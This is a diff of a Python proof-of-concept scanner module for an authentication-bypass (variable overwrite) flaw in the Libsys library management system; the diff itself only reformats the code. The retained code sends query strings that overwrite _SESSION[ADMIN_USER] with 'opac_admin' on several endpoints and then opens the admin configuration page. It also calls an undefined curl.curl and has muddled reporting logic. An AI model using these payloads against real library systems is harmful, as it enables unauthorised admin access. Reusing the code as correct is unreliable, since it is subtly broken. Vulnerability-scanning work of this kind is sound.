@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import datetime
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Libsys_0005' # 平台漏洞编号，留空
+    vuln_id = 'Libsys_0005'  # 平台漏洞编号，留空
     name = '汇文图书管理系统 变量覆盖'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = '2015-08-15'  # 漏洞公布时间
     desc = '''
         汇文（Libsys）图书管理系统存在变量覆盖漏洞。
@@ -23,6 +24,7 @@ class Vuln(ABVuln):
     product = '汇文软件'  # 漏洞应用名称
     product_version = 'V5.5'  # 漏洞应用版本
 
+
 def testing(url):
     hh = hackhttp.hackhttp()
     code, head, res, errcode, _ = hh.http(url)
@@ -30,6 +32,7 @@ def testing(url):
         return True
     else:
         return False
+
 
 class Poc(ABPoc):
     poc_id = '6838fd1f-7e7a-4c8e-a236-eb740117e626'
@@ -43,7 +46,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             playload = (
                 '/recm/common.php?_SESSION[ADMIN_USER]=opac_admin',
@@ -51,12 +54,14 @@ class Poc(ABPoc):
                 '/opac/ajax_ebook.php?_SESSION[ADMIN_USER]=opac_admin',
                 '/top/top_custom.php?_SESSION[ADMIN_USER]=opac_admin'
             )
-            
-            code, head, res, errcode, _ = hh.http(self.target + '/admin/login.php')
+
+            code, head, res, errcode, _ = hh.http(
+                self.target + '/admin/login.php')
             if code == 200 and 'opac_admin' in res:
-                for p in playload: 
+                for p in playload:
                     if testing(self.target + p):
-                        code, head, res, errcode, _ = curl.curl(self.target + '/admin/cfg_basic.php')
+                        code, head, res, errcode, _ = curl.curl(
+                            self.target + '/admin/cfg_basic.php')
                         if code == 200 and 'strSchoolName' in res:
                             log = '\nGood Luck, Login succeed'
                         else:
@@ -64,13 +69,14 @@ class Poc(ABPoc):
                             #security_hole(url + p+ log)
                             self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                                 target=self.target, name=self.vuln.name))
-                            return 
+                            return
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
